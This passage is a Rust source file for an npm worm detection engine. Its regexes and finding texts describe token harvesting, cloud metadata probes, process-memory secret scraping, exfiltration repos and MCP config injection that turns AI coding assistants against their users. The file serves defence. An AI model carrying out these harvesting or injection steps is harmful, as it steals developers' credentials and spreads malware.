//! Self-propagating npm worm detection engine (`"worm_propagation"`).
//!
//! [`WormPropagationEngine`] detects the harvest-then-republish propagation
//! loop that generic install-script scanners miss because each individual API
//! call (npm whoami, maintainer search, npm publish) is "legitimate" in
//! isolation — only the **combination** is malicious.
//!
//! Covers WORM-01 through WORM-15 from the threat KB (Section 4.1), sourced
//! from documented campaigns: Shai-Hulud v1/v2, SANDWORM\_MODE, CanisterWorm,
//! Phantom Gyp/Miasma, and CanisterSprawl.
//!
//! Detection strategy:
//! - **Package-level signals** (`package.json` lifecycle scripts) — WORM-01,
//!   WORM-04, WORM-05, WORM-06, WORM-07, WORM-08, WORM-09, WORM-11, WORM-12,
//!   WORM-15, plus combo findings.
//! - **Per-file text signals** applied to any JS/TS/Shell file — WORM-02,
//!   WORM-03, WORM-04, WORM-10, WORM-13, WORM-14.
//!
//! All regexes are compiled exactly once via [`std::sync::OnceLock`].

use std::sync::OnceLock;

use regex::Regex;

use crate::engine::{DetectionEngine, FileKind, FileUnit, ScanContext};
use crate::types::{Confidence, FileLocation, Finding, Severity, ThreatCategory};

// ── Engine name (must match every Finding::engine stamp) ────────────────────
const ENGINE: &str = "worm_propagation";

// ═══════════════════════════════════════════════════════════════════════════
// Lazy regex helpers
// ═══════════════════════════════════════════════════════════════════════════

/// Initialise a OnceLock<Regex>, falling back to a never-match sentinel on
/// (impossible) compile failure so the engine degrades gracefully.
fn get_re(lock: &'static OnceLock<Regex>, pattern: &'static str) -> &'static Regex {
    lock.get_or_init(|| {
        Regex::new(pattern).unwrap_or_else(|_| {
            Regex::new(r"[^\s\S]").expect("invariant: never-match fallback regex must compile")
        })
    })
}

// ── Regex declarations (one OnceLock per pattern) ───────────────────────────

// WORM-01: npm publish / pack invoked from a lifecycle hook body
static RE_NPM_PUBLISH: OnceLock<Regex> = OnceLock::new();
const PAT_NPM_PUBLISH: &str =
    r"(?i)\bnpm\s+(?:publish|pack)\b|PUT\s+https?://registry\.npmjs\.org/";

// WORM-02: npm token validation endpoint (whoami)
static RE_WHOAMI: OnceLock<Regex> = OnceLock::new();
const PAT_WHOAMI: &str = r"registry\.npmjs\.org/-/whoami|/-/whoami";

// WORM-03: maintainer package enumeration
static RE_MAINTAINER_ENUM: OnceLock<Regex> = OnceLock::new();
const PAT_MAINTAINER_ENUM: &str = "registry\\.npmjs\\.org/-/v1/search\\?[^'\"]*text=maintainer[:%]";

// WORM-04 (a): token read side — .npmrc or NPM_TOKEN env var references
static RE_TOKEN_HARVEST: OnceLock<Regex> = OnceLock::new();
const PAT_TOKEN_HARVEST: &str = r"(?i)\.npmrc|NPM_TOKEN|npm_config__authtoken|_authToken";

// WORM-05: PyPI publish (twine) invoked from an npm context
static RE_TWINE_PUBLISH: OnceLock<Regex> = OnceLock::new();
const PAT_TWINE_PUBLISH: &str = r"(?i)\btwine\s+upload\b|TWINE_PASSWORD|PYPI_TOKEN|\.pypirc";

// WORM-06: GitHub Actions runner download from a lifecycle script
static RE_GHA_RUNNER: OnceLock<Regex> = OnceLock::new();
const PAT_GHA_RUNNER: &str =
    r"(?i)actions/runner/releases/download|/actions/runners/registration-token";

// WORM-07: Bun runtime download in a lifecycle script
static RE_BUN_DOWNLOAD: OnceLock<Regex> = OnceLock::new();
const PAT_BUN_DOWNLOAD: &str =
    r"(?i)oven-sh/bun/releases/download|github\.com/oven-sh/bun|bun\.sh/install";

// WORM-08: TruffleHog invocation
static RE_TRUFFLEHOG: OnceLock<Regex> = OnceLock::new();
const PAT_TRUFFLEHOG: &str = r"(?i)trufflehog|trufflesecurity/trufflehog";

// WORM-09: detached background process orphaning (spawn detached + unref)
static RE_DETACHED_SPAWN: OnceLock<Regex> = OnceLock::new();
const PAT_DETACHED_SPAWN: &str = r"(?i)spawn\s*\([^)]*detached\s*:\s*true|\.unref\s*\(\s*\)";

// WORM-04 (CanisterWorm variant): findNpmTokens function name — the worm's
// canonical helper function present in CanisterWorm's deploy.js. No legitimate
// npm package defines a function specifically for harvesting npm tokens.
static RE_FIND_NPM_TOKENS: OnceLock<Regex> = OnceLock::new();
const PAT_FIND_NPM_TOKENS: &str = r"\bfindNpmTokens\b";

// WORM-10: worm family marker strings embedded in payload
static RE_FAMILY_MARKERS: OnceLock<Regex> = OnceLock::new();
const PAT_FAMILY_MARKERS: &str = concat!(
    r"Sha1-Hulud|Shai-Hulud",
    r"|niagA oG eW ereH :duluH-iahS",
    r"|SANDWORM_MODE",
    r#"|"Miasma: The Spreading Blight""#,
    r#"|"Hades\s*[–-]\s*The End for the Damned""#,
    r"|firedalazer",
);

// WORM-11: GitHub exfil repo creation from a hook
static RE_GITHUB_REPO_CREATE: OnceLock<Regex> = OnceLock::new();
const PAT_GITHUB_REPO_CREATE: &str = r"api\.github\.com/user/repos";

// WORM-12: cloud IMDS probe
static RE_IMDS_PROBE: OnceLock<Regex> = OnceLock::new();
const PAT_IMDS_PROBE: &str =
    r"169\.254\.169\.254|metadata\.google\.internal|X-aws-ec2-metadata-token";

// WORM-13: GitHub Actions secret dump pattern in workflow content
static RE_GHA_SECRET_DUMP: OnceLock<Regex> = OnceLock::new();
const PAT_GHA_SECRET_DUMP: &str = r"toJSON\s*\(\s*secrets\s*\)|github\.event\.discussion\.body";

// WORM-14: process-memory scraping for Actions secrets
static RE_PROC_MEM_SCRAPE: OnceLock<Regex> = OnceLock::new();
const PAT_PROC_MEM_SCRAPE: &str = concat!(
    r#"["']isSecret["']\s*:\s*true"#,
    r"|/proc/\d+/mem",
    r"|tr -d '\\\\0'[^|]*\|[^|]*grep -aoE",
    r"|task_for_pid|vm_read|VirtualQueryEx|ReadProcessMemory",
);

// WORM-15: MCP server config injection into AI coding assistants.
// Match both joined paths (e.g. ~/.cursor/mcp.json) and path.join()
// split forms (e.g. path.join(homedir(), '.cursor', 'mcp.json')).
// The quoted-segment form "['\"].cursor['\"]" catches path.join('...', '.cursor', ...).
static RE_MCP_INJECTION: OnceLock<Regex> = OnceLock::new();
const PAT_MCP_INJECTION: &str = concat!(
    r"\.claude/settings\.json",
    r"|\.cursor/mcp\.json",
    // Quoted '.cursor' segment — covers path.join(..., '.cursor', 'mcp.json') forms.
    // Uses character class [\"'] to avoid raw-string quoting issues.
    "|[\"'](\\.cursor)[\"']",
    r"|\.continue/config\.json",
    r"|\.windsurf/mcp\.json",
    r"|Library/Application Support/Claude/claude_desktop_config\.json",
    r"|\.dev-utils",
    r"|\.codeium",
);

// ── Lifecycle hook key names we recognise in package.json ───────────────────
static HOOK_KEYS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepare",
    "prepublish",
    "prepublishOnly",
];

// ═══════════════════════════════════════════════════════════════════════════
// WormPropagationEngine
// ═══════════════════════════════════════════════════════════════════════════

/// Detection engine for the self-propagating npm worm class (WORM-01..15).
///
/// Inspects `package.json` lifecycle hooks for propagation calls and scans
/// JS/TS/Shell files for the individual + combined API-call patterns that
/// constitute the harvest-then-republish loop.
#[derive(Debug, Default)]
pub struct WormPropagationEngine;

impl WormPropagationEngine {
    // ── Package-level scan (uses ctx.package_json) ──────────────────────────

    /// Collect all lifecycle hook bodies from `package.json` into a single
    /// concatenated string for pattern matching, and return the set of hook
    /// names that are present.
    fn hook_bodies(pkg: &serde_json::Value) -> (Vec<String>, String) {
        let scripts = match pkg.get("scripts").and_then(|s| s.as_object()) {
            Some(obj) => obj,
            None => return (Vec::new(), String::new()),
        };

        let mut names: Vec<String> = Vec::new();
        let mut combined = String::new();

        for key in HOOK_KEYS {
            if let Some(body) = scripts.get(*key).and_then(|v| v.as_str()) {
                names.push((*key).to_string());
                combined.push_str(body);
                combined.push('\n');
            }
        }

        (names, combined)
    }

    fn scan_package_json(&self, ctx: &ScanContext<'_>, findings: &mut Vec<Finding>) {
        let pkg = match ctx.package_json {
            Some(p) => p,
            None => return,
        };

        let (hook_names, hooks_text) = Self::hook_bodies(pkg);
        if hooks_text.is_empty() {
            return;
        }

        let pkg_path = "package.json";

        // Track combo signals across all hooks for this package.
        let mut has_token_harvest = false;
        let mut has_npm_publish = false;
        let mut has_pypi_creds = false;

        // WORM-01: npm publish / pack inside a lifecycle hook
        {
            let re = get_re(&RE_NPM_PUBLISH, PAT_NPM_PUBLISH);
            if re.is_match(&hooks_text) {
                has_npm_publish = true;
                findings.push(
                    Finding::new(
                        ENGINE,
                        ThreatCategory::SupplyChain,
                        Severity::Critical,
                        Confidence::High,
                        "npm publish/pack invoked from lifecycle hook (WORM-01)",
                        "Calling `npm publish` or `npm pack` from a preinstall/postinstall/prepare \
                         hook is the canonical worm propagation step. No legitimate package \
                         republishes itself during installation. Seen in Shai-Hulud v1/v2, \
                         SANDWORM_MODE, CanisterWorm, Phantom Gyp, s1ngularity, Miasma.",
                    )
                    .with_rule_id("WORM_NPM_PUBLISH_FROM_HOOK")
                    .with_location(FileLocation::file(pkg_path))
                    .with_evidence(hook_names.join(", "), 160),
                );
            }
        }

        // WORM-04 (harvest side): .npmrc / NPM_TOKEN read in hook body
        {
            let re = get_re(&RE_TOKEN_HARVEST, PAT_TOKEN_HARVEST);
            if re.is_match(&hooks_text) {
                has_token_harvest = true;
                findings.push(
                    Finding::new(
                        ENGINE,
                        ThreatCategory::CredentialAccess,
                        Severity::High,
                        Confidence::High,
                        "npm auth token access in lifecycle hook (WORM-04 harvest side)",
                        "The lifecycle script reads .npmrc or references NPM_TOKEN / _authToken. \
                         This is the credential-harvest step of the worm propagation loop. \
                         Alone it is High; combined with npm publish it becomes Critical.",
                    )
                    .with_rule_id("WORM_TOKEN_HARVEST_IN_HOOK")
                    .with_location(FileLocation::file(pkg_path)),
                );
            }
        }

        // WORM-05: PyPI / twine publish from npm lifecycle
        {
            let re = get_re(&RE_TWINE_PUBLISH, PAT_TWINE_PUBLISH);
            if re.is_match(&hooks_text) {
                has_pypi_creds = true;
                findings.push(
                    Finding::new(
                        ENGINE,
                        ThreatCategory::SupplyChain,
                        Severity::Critical,
                        Confidence::High,
                        "PyPI/twine publish invoked from npm lifecycle hook (WORM-05)",
                        "Calling `twine upload` or referencing TWINE_PASSWORD/.pypirc inside an \
                         npm lifecycle script is the cross-ecosystem worm propagation step used by \
                         CanisterSprawl — the first documented npm→PyPI worm. An npm package has \
                         no legitimate reason to publish to PyPI.",
                    )
                    .with_rule_id("WORM_CROSS_ECOSYSTEM_TWINE")
                    .with_location(FileLocation::file(pkg_path)),
                );
            }
        }

        // WORM-06: GitHub Actions runner installation from hook
        {
            let re = get_re(&RE_GHA_RUNNER, PAT_GHA_RUNNER);
            if re.is_match(&hooks_text) {
                findings.push(
                    Finding::new(
                        ENGINE,
                        ThreatCategory::SupplyChain,
                        Severity::Critical,
                        Confidence::High,
                        "GitHub Actions self-hosted runner installed from lifecycle hook (WORM-06)",
                        "Downloading and registering a GitHub Actions self-hosted runner from an \
                         npm install hook installs a persistent remote-code-execution foothold. \
                         Seen in Shai-Hulud 2.0 (v2.330.0 runner with discussion.body RCE).",
                    )
                    .with_rule_id("WORM_GHA_RUNNER_INSTALL")
                    .with_location(FileLocation::file(pkg_path)),
                );
            }
        }

        // WORM-07: Bun runtime download in lifecycle
        {
            let re = get_re(&RE_BUN_DOWNLOAD, PAT_BUN_DOWNLOAD);
            if re.is_match(&hooks_text) {
                findings.push(
                    Finding::new(
                        ENGINE,
                        ThreatCategory::SupplyChain,
                        Severity::High,
                        Confidence::High,
                        "Bun runtime downloaded in lifecycle hook (WORM-07)",
                        "Downloading the Bun JavaScript runtime from oven-sh/bun or bun.sh inside \
                         a lifecycle script is a worm evasion technique: Bun is used to execute \
                         the main payload to bypass Node.js-scoped process monitors. Seen in \
                         Shai-Hulud 2.0, Phantom Gyp/Miasma, SANDWORM_MODE.",
                    )
                    .with_rule_id("WORM_BUN_RUNTIME_DOWNLOAD")
                    .with_location(FileLocation::file(pkg_path)),
                );
            }
        }

        // WORM-08: TruffleHog invocation in lifecycle
        {
            let re = get_re(&RE_TRUFFLEHOG, PAT_TRUFFLEHOG);
            if re.is_match(&hooks_text) {
                findings.push(
                    Finding::new(
                        ENGINE,
                        ThreatCategory::CredentialAccess,
                        Severity::High,
                        Confidence::High,
                        "TruffleHog secret scanner invoked from lifecycle hook (WORM-08)",
                        "TruffleHog is a secret-scanning tool; invoking it from a package \
                         postinstall script scans the developer's entire filesystem for 800+ \
                         secret types. Used by Shai-Hulud v1/v2 to harvest credentials before \
                         deletion to cover tracks.",
                    )
                    .with_rule_id("WORM_TRUFFLEHOG_IN_HOOK")
                    .with_location(FileLocation::file(pkg_path)),
                );
            }
        }

        // WORM-09: detached/orphaned background process from lifecycle
        {
            let re = get_re(&RE_DETACHED_SPAWN, PAT_DETACHED_SPAWN);
            if re.is_match(&hooks_text) {
                findings.push(
                    Finding::new(
                        ENGINE,
                        ThreatCategory::SupplyChain,
                        Severity::High,
                        Confidence::High,
                        "Detached background process spawned from lifecycle hook (WORM-09)",
                        "spawn({ detached: true }) followed by .unref() forks a child process that \
                         survives the npm install process exit. Used by Shai-Hulud 2.0 to obscure \
                         timing: `npm install` returns exit 0 before malicious work begins.",
                    )
                    .with_rule_id("WORM_DETACHED_PROCESS_ORPHAN")
                    .with_location(FileLocation::file(pkg_path)),
                );
            }
        }

        // WORM-11: GitHub exfil repo creation from hook
        {
            let re = get_re(&RE_GITHUB_REPO_CREATE, PAT_GITHUB_REPO_CREATE);
            if re.is_match(&hooks_text) {
                findings.push(
                    Finding::new(
                        ENGINE,
                        ThreatCategory::Exfiltration,
                        Severity::High,
                        Confidence::High,
                        "GitHub repository creation API call in lifecycle hook (WORM-11)",
                        "POSTing to api.github.com/user/repos from an install script creates a \
                         GitHub repository under the victim's account used as an exfiltration \
                         dead-drop. No npm package has a legitimate reason to create GitHub repos \
                         at install time.",
                    )
                    .with_rule_id("WORM_GITHUB_REPO_CREATE_IN_HOOK")
                    .with_location(FileLocation::file(pkg_path)),
                );
            }
        }

        // WORM-12: cloud IMDS probe in lifecycle
        {
            let re = get_re(&RE_IMDS_PROBE, PAT_IMDS_PROBE);
            if re.is_match(&hooks_text) {
                findings.push(
                    Finding::new(
                        ENGINE,
                        ThreatCategory::CredentialAccess,
                        Severity::High,
                        Confidence::High,
                        "Cloud instance metadata (IMDS) probe in lifecycle hook (WORM-12)",
                        "Probing 169.254.169.254 (AWS/Azure IMDS) or metadata.google.internal \
                         from an npm lifecycle script harvests short-lived IAM role credentials \
                         on cloud instances. Present in Shai-Hulud v1/v2, CanisterWorm, Phantom Gyp.",
                    )
                    .with_rule_id("WORM_IMDS_PROBE")
                    .with_location(FileLocation::file(pkg_path)),
                );
            }
        }

        // WORM-15: MCP server config injection into AI coding assistants
        {
            let re = get_re(&RE_MCP_INJECTION, PAT_MCP_INJECTION);
            if re.is_match(&hooks_text) {
                findings.push(
                    Finding::new(
                        ENGINE,
                        ThreatCategory::FilesystemAbuse,
                        Severity::High,
                        Confidence::High,
                        "MCP server injection into AI coding assistant config (WORM-15)",
                        "Writing to ~/.claude/settings.json, ~/.cursor/mcp.json, \
                         ~/.continue/config.json, ~/.windsurf/mcp.json, or creating \
                         ~/.dev-utils/ from a lifecycle hook injects a malicious MCP server into \
                         AI coding assistants. SANDWORM_MODE used this to embed prompt injection \
                         that silently exfiltrates SSH keys, AWS credentials, and npm tokens.",
                    )
                    .with_rule_id("WORM_MCP_INJECTION")
                    .with_location(FileLocation::file(pkg_path)),
                );
            }
        }

        // ── WORM-04 COMBO: token harvest + publish (Critical escalation) ─────
        if has_token_harvest && has_npm_publish {
            findings.push(
                Finding::new(
                    ENGINE,
                    ThreatCategory::SupplyChain,
                    Severity::Critical,
                    Confidence::High,
                    "Token harvest + npm publish combo — worm propagation fingerprint (WORM-04)",
                    "The lifecycle script BOTH reads npm auth tokens (.npmrc/NPM_TOKEN) AND calls \
                     `npm publish`. This combination is the exact harvest-then-republish worm \
                     propagation loop; zero legitimate packages need both. Definitive indicator of \
                     Shai-Hulud, SANDWORM_MODE, CanisterWorm, Phantom Gyp, or s1ngularity family.",
                )
                .with_rule_id("WORM_TOKEN_HARVEST_PUBLISH_COMBO")
                .with_location(FileLocation::file(pkg_path)),
            );
        }

        // ── Cross-ecosystem combo: npm token harvest + PyPI creds ────────────
        if has_token_harvest && has_pypi_creds {
            findings.push(
                Finding::new(
                    ENGINE,
                    ThreatCategory::SupplyChain,
                    Severity::Critical,
                    Confidence::High,
                    "Cross-ecosystem credential sweep (npm + PyPI) — CanisterSprawl pattern (WORM-05 combo)",
                    "The lifecycle script reads BOTH npm credentials and PyPI credentials in the \
                     same execution context. This is definitively the CanisterSprawl cross-ecosystem \
                     worm signature: a single npm install hook sweeping credentials for \
                     propagation across two package ecosystems.",
                )
                .with_rule_id("WORM_CROSS_ECOSYSTEM_WORM_COMPOUND")
                .with_location(FileLocation::file(pkg_path)),
            );
        }
    }

    // ── Per-file text scan ───────────────────────────────────────────────────

    /// Scan a single JS/TS/Shell file for worm propagation patterns that appear
    /// in bundled payload files (not just in package.json hook bodies).
    fn scan_file(&self, file: &FileUnit, findings: &mut Vec<Finding>) {
        // Only scan text-looking script files and text/unknown files (bundled JS)
        let is_relevant = matches!(
            file.kind,
            FileKind::Javascript
                | FileKind::TypeScript
                | FileKind::Shell
                | FileKind::Text
                | FileKind::Unknown
        ) && file.looks_textual();
        if !is_relevant {
            return;
        }

        // A HEAD+TAIL window (not head-only) closes the pad-before-payload
        // evasion uniformly with the other text engines.
        const MAX_SCAN_BYTES: usize = 8 * 1024 * 1024; // 8 MiB cap, mirrors ioc.rs
        let text: std::borrow::Cow<'_, str> =
            crate::engine::scan_window(file.text_lossy(), MAX_SCAN_BYTES);

        let path = &file.rel_path;
        let lines: Vec<(usize, &str)> = text.lines().enumerate().map(|(i, l)| (i + 1, l)).collect();

        // Accumulate combo signals for this file.
        let mut file_has_token_harvest = false;
        let mut file_has_npm_publish = false;

        // WORM-01 (file level): npm publish in any bundled JS/shell
        {
            let re = get_re(&RE_NPM_PUBLISH, PAT_NPM_PUBLISH);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    file_has_npm_publish = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::SupplyChain,
                            Severity::Critical,
                            Confidence::High,
                            "npm publish call in bundled script (WORM-01)",
                            "A script file in this package calls `npm publish` or PUTs to the npm \
                             registry. No bundled utility should republish packages; this is the \
                             worm propagation action.",
                        )
                        .with_rule_id("WORM_NPM_PUBLISH_FROM_HOOK")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-02: npm whoami / token validation endpoint
        {
            let re = get_re(&RE_WHOAMI, PAT_WHOAMI);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::Critical,
                            Confidence::High,
                            "npm token validation call (/-/whoami) in script (WORM-02)",
                            "Querying registry.npmjs.org/-/whoami validates a harvested npm auth \
                             token before propagation. Near-zero false-positive rate: this endpoint \
                             is only useful to a worm confirming a stolen token is still valid. \
                             Present in Shai-Hulud v1/v2, SANDWORM_MODE, CanisterWorm, Miasma.",
                        )
                        .with_rule_id("WORM_NPM_WHOAMI_FROM_HOOK")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-03: maintainer package enumeration
        {
            let re = get_re(&RE_MAINTAINER_ENUM, PAT_MAINTAINER_ENUM);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::SupplyChain,
                            Severity::Critical,
                            Confidence::High,
                            "npm maintainer package enumeration in script (WORM-03)",
                            "Querying /-/v1/search?text=maintainer:{user} enumerates all packages \
                             accessible to a stolen token — the prerequisite step for worm \
                             propagation. Zero false-positive rate: no package legitimately \
                             enumerates the full package portfolio of the authenticated user at \
                             install time. Identical call present in all five npm worm families.",
                        )
                        .with_rule_id("WORM_NPM_MAINTAINER_ENUM")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-04 (harvest side, file level): npm token references
        {
            let re = get_re(&RE_TOKEN_HARVEST, PAT_TOKEN_HARVEST);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    file_has_token_harvest = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
                            Confidence::High,
                            "npm auth token access in bundled script (WORM-04 harvest)",
                            "This script accesses .npmrc, NPM_TOKEN, or _authToken. In isolation \
                             this is High; combined with npm publish in the same file it escalates \
                             to the Critical WORM-04 combo finding.",
                        )
                        .with_rule_id("WORM_TOKEN_HARVEST_IN_HOOK")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-10: worm family marker strings
        {
            let re = get_re(&RE_FAMILY_MARKERS, PAT_FAMILY_MARKERS);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::KnownMalware,
                            Severity::High,
                            Confidence::High,
                            "Known worm family marker string detected (WORM-10)",
                            "The file contains a campaign marker string embedded by the worm author: \
                             Shai-Hulud, niagA oG eW ereH (Phantom Gyp reversed), SANDWORM_MODE, \
                             'Miasma: The Spreading Blight', 'Hades – The End for the Damned', or \
                             firedalazer. These are inserted by the malware itself as campaign \
                             identifiers and have near-zero false-positive rate.",
                        )
                        .with_rule_id("WORM_FAMILY_MARKERS")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-13: GitHub Actions secret dump pattern
        {
            let re = get_re(&RE_GHA_SECRET_DUMP, PAT_GHA_SECRET_DUMP);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
                            Confidence::High,
                            "GitHub Actions secret dump pattern in script (WORM-13)",
                            "The file contains `toJSON(secrets)` or references `github.event.discussion.body` \
                             without sanitization — used to inject a GitHub Actions workflow that \
                             serializes all CI secrets. Seen in Shai-Hulud v1/v2, SANDWORM_MODE, \
                             Miasma/@redhat.",
                        )
                        .with_rule_id("WORM_GHA_SECRET_DUMP")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-14: process-memory scraping for GitHub Actions secrets
        {
            let re = get_re(&RE_PROC_MEM_SCRAPE, PAT_PROC_MEM_SCRAPE);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::Critical,
                            Confidence::High,
                            "Process memory scraping for GitHub Actions secrets (WORM-14)",
                            "The file contains a pattern used to scrape /proc/{pid}/mem of the \
                             GitHub Actions Runner.Worker process to extract masked secrets in \
                             plaintext. The exact search string is `\"isSecret\":true`. Used by \
                             CanisterWorm (Trivy phase), Phantom Gyp/Miasma, and Hades.",
                        )
                        .with_rule_id("WORM_PROC_MEM_SCRAPE")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-08 (file level): TruffleHog reference in bundled JS
        {
            let re = get_re(&RE_TRUFFLEHOG, PAT_TRUFFLEHOG);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
                            Confidence::High,
                            "TruffleHog secret scanner referenced in bundled script (WORM-08)",
                            "A bundled script references TruffleHog — used by Shai-Hulud v1/v2 to \
                             scan the developer's machine for 800+ secret types and then delete \
                             the binary to cover tracks.",
                        )
                        .with_rule_id("WORM_TRUFFLEHOG_IN_HOOK")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-12 (file level): IMDS probe in bundled file
        {
            let re = get_re(&RE_IMDS_PROBE, PAT_IMDS_PROBE);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
                            Confidence::High,
                            "Cloud IMDS probe URL in bundled script (WORM-12)",
                            "Reference to 169.254.169.254, metadata.google.internal, or an AWS \
                             IMDS token header in a bundled script indicates cloud credential \
                             harvesting on EC2/GKE/AKS instances.",
                        )
                        .with_rule_id("WORM_IMDS_PROBE")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-15 (file level): MCP config path in bundled script
        {
            let re = get_re(&RE_MCP_INJECTION, PAT_MCP_INJECTION);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::FilesystemAbuse,
                            Severity::High,
                            Confidence::High,
                            "AI coding assistant MCP config path in bundled script (WORM-15)",
                            "A bundled script references ~/.claude/settings.json, ~/.cursor/mcp.json, \
                             ~/.continue/config.json, ~/.windsurf/mcp.json, or ~/.dev-utils — paths \
                             targeted by SANDWORM_MODE's MCP server injection to weaponize AI \
                             coding assistants as persistent credential exfiltrators.",
                        )
                        .with_rule_id("WORM_MCP_INJECTION")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-06 (file level): GitHub Actions runner download in bundled script.
        // Worm payloads (Shai-Hulud 2.0) install a self-hosted runner from
        // a bundled JS file rather than directly in the hook body string.
        {
            let re = get_re(&RE_GHA_RUNNER, PAT_GHA_RUNNER);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::SupplyChain,
                            Severity::Critical,
                            Confidence::High,
                            "GitHub Actions self-hosted runner download in bundled script (WORM-06)",
                            "A bundled script downloads a GitHub Actions self-hosted runner \
                             (actions/runner/releases/download). This installs a persistent \
                             remote-code-execution foothold. Seen in Shai-Hulud 2.0 (v2.330.0 \
                             runner with discussion.body RCE). No npm package legitimately \
                             provisions a GHA runner at install time.",
                        )
                        .with_rule_id("WORM_GHA_RUNNER_INSTALL")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-07 (file level): Bun runtime download in bundled script.
        // Worm payloads download Bun at runtime to evade Node.js-scoped process
        // monitors. The download call lives in a bundled JS file, not the hook body.
        {
            let re = get_re(&RE_BUN_DOWNLOAD, PAT_BUN_DOWNLOAD);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::SupplyChain,
                            Severity::High,
                            Confidence::High,
                            "Bun runtime download in bundled script (WORM-07)",
                            "A bundled script downloads the Bun JavaScript runtime \
                             (oven-sh/bun/releases/download or bun.sh/install). Bun is used \
                             specifically to execute the main worm payload outside Node.js \
                             process monitors. Seen in Shai-Hulud 2.0 (setup_bun.js), \
                             Phantom Gyp/Miasma, and SANDWORM_MODE.",
                        )
                        .with_rule_id("WORM_BUN_RUNTIME_DOWNLOAD")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-09 (file level): detached background process orphan in bundled script.
        // Shai-Hulud 2.0's bun_environment.js forks a detached child and calls
        // .unref() so npm install returns exit 0 before malicious work begins.
        {
            let re = get_re(&RE_DETACHED_SPAWN, PAT_DETACHED_SPAWN);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::SupplyChain,
                            Severity::High,
                            Confidence::High,
                            "Detached background process orphan in bundled script (WORM-09)",
                            "A bundled script spawns a detached child process with .unref(), \
                             causing the payload to outlive the npm install process. This timing \
                             evasion makes `npm install` return exit 0 before malicious work \
                             begins. Seen in Shai-Hulud 2.0 (bun_environment.js), react-zutils, \
                             oob.moika, and Lazarus BeaverTail.",
                        )
                        .with_rule_id("WORM_DETACHED_PROCESS_ORPHAN")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-11 (file level): GitHub exfil repo creation in bundled script.
        // Worm payloads create GitHub repos from a bundled file, not the hook body.
        {
            let re = get_re(&RE_GITHUB_REPO_CREATE, PAT_GITHUB_REPO_CREATE);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::Exfiltration,
                            Severity::High,
                            Confidence::High,
                            "GitHub repository creation API call in bundled script (WORM-11)",
                            "A bundled script POSTs to api.github.com/user/repos to create a \
                             GitHub repository used as an exfiltration dead-drop. Seen in \
                             Shai-Hulud v1/v2 (exfil with 'Sha1-Hulud: The Second Coming.' \
                             description), SANDWORM_MODE, and Miasma.",
                        )
                        .with_rule_id("WORM_GITHUB_REPO_CREATE_IN_HOOK")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // WORM-04 (CanisterWorm variant, file level): findNpmTokens function name.
        // CanisterWorm's deploy.js defines `findNpmTokens()` as its canonical token
        // harvesting helper. No legitimate npm package defines a function by this name.
        {
            let re = get_re(&RE_FIND_NPM_TOKENS, PAT_FIND_NPM_TOKENS);
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
